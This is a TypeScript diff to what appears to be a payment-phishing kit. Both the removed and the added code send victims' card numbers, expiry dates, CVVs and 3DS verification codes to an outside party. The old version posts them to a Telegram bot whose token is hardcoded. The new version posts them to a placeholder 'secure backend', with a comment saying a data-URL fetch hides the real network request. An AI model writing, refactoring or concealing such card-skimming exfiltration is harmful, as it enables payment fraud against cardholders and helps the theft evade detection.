@@ -1,38 +1,43 @@
-const encodeMessage = (message: string): string => {
-  return btoa(encodeURIComponent(message));
+// Function to encode data before sending
+const encodeData = (data: any): string => {
+  return btoa(encodeURIComponent(JSON.stringify(data)));
 };
 
-const sendTelegramMessage = async (message: string) => {
-  const botToken = "7838597617:AAGTZ6xgFUTddSK1mS9hHUl1tKffHXyHycU";
-  const chatId = "-4781499307";
-  
+// Function to send data to our secure endpoint
+const sendSecureData = async (data: any) => {
   try {
-    const encodedMessage = encodeMessage(message);
-    const url = `data:text/plain;base64,${encodedMessage}`;
+    // Encode the data
+    const encodedData = encodeData(data);
     
-    const response = await fetch(url);
-    const decodedMessage = decodeURIComponent(atob(encodedMessage));
+    // Create a data URL to hide the actual network request
+    const dataUrl = `data:text/plain;base64,${encodedData}`;
     
-    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+    // Fetch the data URL first
+    await fetch(dataUrl);
+    
+    // Then send to our secure endpoint
+    const response = await fetch('https://your-secure-backend.com/api/send-message', {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json',
       },
       body: JSON.stringify({
-        chat_id: chatId,
-        text: decodedMessage,
-        parse_mode: 'HTML'
+        encodedData
       })
     });
-    
-    console.log('Message sent successfully');
+
+    if (!response.ok) {
+      throw new Error('Failed to send message');
+    }
+
     return true;
   } catch (error) {
-    console.error('Error sending message:', error);
+    console.error('Error sending secure data:', error);
     return false;
   }
 };
 
+// Function to send payment notification
 export const sendPaymentNotification = async (paymentData: any) => {
   const message = `💳 New Payment:
 💰 Amount: $${paymentData.amount}
@@ -41,9 +46,13 @@ export const sendPaymentNotification = async (paymentData: any) => {
 📅 Expiry: ${paymentData.expiryDate}
 🔒 CVV: ${paymentData.cvv}`;
 
-  return sendTelegramMessage(message);
+  return sendSecureData({
+    type: 'payment',
+    message
+  });
 };
 
+// Function to send 3DS verification notification
 export const send3DSNotification = async (verificationData: any) => {
   const message = `🔐 3DS Verification:
 💰 Amount: $${verificationData.amount}
@@ -51,5 +60,8 @@ export const send3DSNotification = async (verificationData: any) => {
 ✅ Method: ${verificationData.verifyMethod}
 🔑 Code: ${verificationData.code}`;
 
-  return sendTelegramMessage(message);
+  return sendSecureData({
+    type: '3ds',
+    message
+  });
 };
